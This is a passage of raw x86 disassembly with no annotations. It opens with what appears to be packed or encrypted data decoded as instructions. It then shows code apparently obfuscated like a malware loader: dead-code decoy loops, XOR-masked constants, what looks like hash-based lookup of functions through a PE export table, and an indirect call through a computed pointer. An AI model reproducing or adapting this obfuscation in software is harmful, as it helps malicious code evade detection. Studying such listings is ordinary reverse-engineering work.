  407edd:	mov    ebp,0x6688a912
  407ee2:	xchg   esi,eax
  407ee3:	xchg   BYTE PTR [ebx-0x5d5f5585],dh
  407ee9:	sub    al,0x16
  407eeb:	pop    esi
  407eec:	sub    dh,bh
  407eee:	add    edi,eax
  407ef0:	or     eax,0x356b62ef
  407ef5:	repz inc ebp
  407ef7:	cmp    BYTE PTR [esi-0x58dd30e3],0x35
  407efe:	inc    ebp
  407eff:	shl    BYTE PTR [edi+edx*8+0x22],1
  407f03:	in     eax,dx
  407f04:	leave  
  407f05:	mov    cl,0xeb
  407f07:	fldcw  WORD PTR [edi+edx*2+0x7d]
  407f0b:	call   0xfdb0:0x78418fb4
  407f12:	push   edx
  407f13:	dec    edi
  407f14:	dec    ebx
  407f15:	jnp    0x407f91
  407f17:	test   al,0xa3
  407f19:	xor    esp,DWORD PTR [eax-0x392424ae]
  407f1f:	add    edx,DWORD PTR [eax-0x113ea6d4]
  407f25:	lahf   
  407f26:	pop    esp
  407f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f28:	xchg   edx,eax
  407f29:	fs ins BYTE PTR es:[edi],dx
  407f2b:	jo     0x407f60
  407f2d:	repnz sbb DWORD PTR [ebp-0x43],esi
  407f31:	iret   
  407f32:	mov    ds:0x3fb22b07,eax
  407f37:	lea    ecx,[eax+0x1b61a2d8]
  407f3d:	pop    edi
  407f3e:	push   es
  407f3f:	mov    dh,0x2b
  407f41:	(bad)  
  407f42:	ss ret 
  407f44:	push   edi
  407f45:	popa   
  407f46:	add    bl,al
  407f48:	add    eax,0x1a8595a7
  407f4d:	cwde   
  407f4e:	sub    BYTE PTR [esi-0x3c4dd2dc],cl
  407f54:	in     eax,0xe8
  407f56:	leave  
  407f57:	mul    BYTE PTR [ebp+0x4fda5b63]
  407f5d:	add    DWORD PTR ds:[edi],0x1e5433aa
  407f64:	xchg   ebp,eax
  407f65:	nop
  407f66:	in     eax,0x90
  407f68:	cmp    edi,ebp
  407f6a:	aas    
  407f6b:	xor    ax,cx
  407f6e:	out    0x67,eax
  407f70:	popa   
  407f71:	mov    esi,0xd4adb1c3
  407f76:	(bad)  
  407f77:	xlat   BYTE PTR ds:[ebx]
  407f78:	(bad)  
  407f79:	rcl    esp,cl
  407f7b:	mov    dh,0xaf
  407f7d:	mov    ecx,0xca222397
  407f82:	sbb    DWORD PTR [esp+ebx*2-0x6d],eax
  407f86:	in     eax,dx
  407f87:	loope  0x407f7c
  407f89:	stos   DWORD PTR es:[edi],eax
  407f8a:	es cs push eax
  407f8d:	jg     0x407f56
  407f8f:	loope  0x407fbd
  407f91:	(bad)  
  407f92:	xchg   ebx,eax
  407f93:	cmp    BYTE PTR [edi-0x28],0x6a
  407f97:	stc    
  407f98:	inc    edx
  407f99:	sub    DWORD PTR [edx-0x64fe7031],esi
  407f9f:	jp     0x407f78
  407fa1:	dec    ebx
  407fa2:	cdq    
  407fa3:	lods   eax,DWORD PTR ds:[esi]
  407fa4:	popw   es
  407fa6:	or     eax,0xbbc90797
  407fab:	jmp    0x407fcc
  407fad:	imul   ebp,DWORD PTR [esi],0x17057c61
  407fb3:	lock jle 0x407fcc
  407fb6:	fwait
  407fb7:	sub    DWORD PTR [eax],edi
  407fb9:	(bad)  
  407fba:	pop    ecx
  407fbb:	adc    ah,bl
  407fbd:	push   es
  407fbe:	push   0xd566d929
  407fc3:	push   ds
  407fc4:	jae    0x407f9d
  407fc6:	mov    al,BYTE PTR [edx]
  407fc8:	or     esi,0x6a
  407fcb:	pop    eax
  407fcc:	lea    edx,[edi+0x751b8524]
  407fd2:	ins    BYTE PTR es:[edi],dx
  407fd3:	pusha  
  407fd4:	out    0x74,al
  407fd6:	jl     0x407f6b
  407fd8:	mov    ds:0x79deecfd,eax
  407fdd:	ds test ah,0x40
  407fe1:	leave  
  407fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe3:	lahf   
  407fe4:	jne    0x407fa3
  407fe6:	xlat   BYTE PTR ds:[ebx]
  407fe7:	mov    esp,ds
  407fe9:	shl    BYTE PTR [edi+0x34def509],1
  407fef:	cld    
  407ff0:	mov    ecx,0xcc9456d2
  407ff5:	push   ecx
  407ff6:	sub    edi,DWORD PTR [eax]
  407ff8:	les    ecx,FWORD PTR [ebp*4-0x5e909400]
  407fff:	jge    0x40803a
  408001:	or     BYTE PTR [edx],dh
  408003:	lods   al,BYTE PTR ds:[esi]
  408004:	push   edx
  408005:	and    ecx,ebp
  408007:	jge    0x40804b
  408009:	add    al,0x76
  40800b:	xor    eax,0x5cc4d997
  408010:	and    bh,ch
  408012:	scas   al,BYTE PTR es:[edi]
  408013:	cld    
  408014:	add    DWORD PTR [edx-0x7607c266],eax
  40801a:	pop    ebp
  40801b:	and    dh,BYTE PTR [esi]
  40801d:	scas   al,BYTE PTR es:[edi]
  40801e:	imul   edx,DWORD PTR [ecx+0x7b],0xffffffdd
  408022:	jns    0x407fb9
  408024:	test   DWORD PTR [edi+0x7d],eax
  408027:	cli    
  408028:	scas   al,BYTE PTR es:[edi]
  408029:	adc    eax,0x8b6cc9b4
  40802e:	inc    ebx
  40802f:	iret   
  408030:	add    al,0x49
  408032:	fcmove st,st(3)
  408034:	jle    0x40808f
  408036:	rcr    ebx,1
  408038:	pop    esp
  408039:	jno    0x408099
  40803b:	in     al,0xf8
  40803d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40803e:	cdq    
  40803f:	mov    WORD PTR ds:0x4fbf1f78,cs
  408045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408046:	cmp    eax,0xc864c9ff
  40804b:	pop    ebp
  40804c:	sahf   
  40804d:	mov    al,0x4b
  40804f:	shl    ah,0x14
  408052:	adc    dh,BYTE PTR [esi+0x781b3b41]
  408058:	adc    DWORD PTR [ebx-0x4b],esp
  40805b:	pop    edx
  40805c:	ret    
  40805d:	dec    ebp
  40805e:	mov    ecx,0xde000bc6
  408063:	pop    edi
  408064:	jne    0x408077
  408066:	iret   
  408067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408068:	inc    esi
  408069:	jae    0x407fee
  40806b:	cwde   
  40806c:	cmp    dh,BYTE PTR [ecx-0x5f150764]
  408072:	in     eax,0x8e
  408074:	mov    BYTE PTR [ebp+0x5b],al
  408077:	pop    ecx
  408078:	pushf  
  408079:	stos   DWORD PTR es:[edi],eax
  40807a:	mov    BYTE PTR [ecx],0x3f
  40807d:	inc    ebp
  40807e:	mov    esp,0xe511d7fa
  408083:	ret    0xf347
  408086:	xor    al,0xaa
  408089:	jns    0x40801d
  40808b:	push   ebx
  40808c:	retfw  0x7370
  408090:	xchg   BYTE PTR [eax+0xf],ch
  408093:	cld    
  408094:	jne    0x408019
  408096:	(bad)  
  408097:	(bad)  
  408098:	cld    
  408099:	aas    
  40809a:	idiv   DWORD PTR [eax]
  40809c:	push   cs
  40809d:	push   es
  40809e:	sti    
  40809f:	aam    0xeb
  4080a1:	(bad)  
  4080a2:	adc    eax,0xbc4890a8
  4080a7:	inc    eax
  4080a8:	aad    0x23
  4080aa:	test   BYTE PTR [eax+0x37a6c31e],bl
  4080b0:	jecxz  0x408038
  4080b2:	xor    al,0xc6
  4080b4:	dec    ebp
  4080b5:	ja     0x4080a0
  4080b7:	leave  
  4080b8:	inc    eax
  4080b9:	mov    cl,0xf6
  4080bb:	cmp    DWORD PTR [ebp+esi*8+0x5eda0e78],ecx
  4080c2:	outs   dx,BYTE PTR ds:[esi]
  4080c3:	jo     0x4080ab
  4080c5:	mov    ds:0xd47abdd9,al
  4080ca:	jl     0x40805d
  4080cc:	or     DWORD PTR [edi-0x5],edx
  4080cf:	dec    ebx
  4080d0:	arpl   WORD PTR [ecx+0x2],ax
  4080d3:	push   cs
  4080d4:	inc    ebx
  4080d5:	not    BYTE PTR [edx+0x8]
  4080d8:	mov    edx,0x5c1f6532
  4080dd:	scas   al,BYTE PTR es:[edi]
  4080de:	push   ebx
  4080df:	(bad)  
  4080e0:	repnz (bad) 
  4080e2:	and    ch,BYTE PTR [ecx+0x47ad85d6]
  4080e8:	add    DWORD PTR [eax+ebx*4+0x0],edx
  4080ec:	arpl   WORD PTR [esi+0x70e74ef3],sp
  4080f2:	fwait
  4080f3:	or     eax,0xeb0f573e
  4080f8:	pop    ds
  4080f9:	jnp    0x40812c
  4080fb:	sub    al,0x10
  4080fd:	push   eax
  4080fe:	lds    ebx,FWORD PTR [ebx+0x5d3c659f]
  408104:	xor    BYTE PTR [ecx+0x4c],dh
  408107:	xor    ah,BYTE PTR [esi+esi*1-0xda4ba47]
  40810e:	cmp    eax,0x78929288
  408113:	ror    BYTE PTR [ebp-0x309d58ce],0x2a
  40811a:	addr16 cld 
  40811c:	test   al,0x8a
  40811e:	adc    bh,BYTE PTR ds:0x803528b1
  408124:	call   0xdca:0xda47bb95
  40812b:	and    dl,ch
  40812d:	mov    edx,0x6393089a
  408132:	pop    eax
  408133:	mov    cl,0xcc
  408135:	jne    0x40814a
  408137:	(bad)  
  408138:	aam    0xa8
  40813a:	xchg   esp,eax
  40813b:	or     dh,cl
  40813d:	pop    esp
  40813e:	repnz pop ss
  408140:	add    DWORD PTR [ecx],edx
  408142:	add    eax,DWORD PTR [ebp+ebx*8+0x79]
  408146:	sbb    BYTE PTR [ebx],ch
  408148:	xor    BYTE PTR [ecx-0x58eb8f7c],cl
  40814e:	cmp    BYTE PTR [ecx+0x61],cl
  408151:	pop    ebx
  408152:	push   ebx
  408153:	adc    bh,ah
  408155:	dec    eax
  408156:	ins    BYTE PTR es:[edi],dx
  408157:	add    dh,ch
  408159:	inc    ecx
  40815a:	xor    ah,BYTE PTR [eax-0x6b633f3d]
  408160:	xchg   esp,eax
  408161:	dec    edi
  408162:	inc    eax
  408163:	mov    ch,0xb9
  408165:	test   ecx,ebx
  408167:	ficom  DWORD PTR [edx+esi*4]
  40816a:	dec    edx
  40816b:	jp     0x408192
  40816d:	fimul  WORD PTR [edi-0x14]
  408170:	or     dl,dl
  408172:	adc    al,0x6e
  408174:	nop
  408175:	cli    
  408176:	cmp    DWORD PTR [edx+0x43],edx
  408179:	cmc    
  40817a:	cmp    eax,ebx
  40817c:	mov    gs,edx
  40817e:	nop
  40817f:	push   esp
  408180:	inc    ebx
  408181:	inc    esp
  408182:	mov    esi,0xb58bda0
  408187:	adc    DWORD PTR [ecx],edi
  408189:	mov    dl,0xbf
  40818b:	sub    dh,BYTE PTR [ecx+0x202ae62c]
  408191:	cwde   
  408192:	sub    BYTE PTR [edx-0x28],dh
  408195:	sub    BYTE PTR [edx-0x14],bh
  408198:	and    eax,0x876040b8
  40819d:	into   
  40819e:	xor    DWORD PTR ds:0x42801c,edi
  4081a4:	mov    edi,0x155c
  4081a9:	sub    edx,edi
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x423532
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x42379e
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x4236be
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421912
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x423596
  408872:	push   0x42354e
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
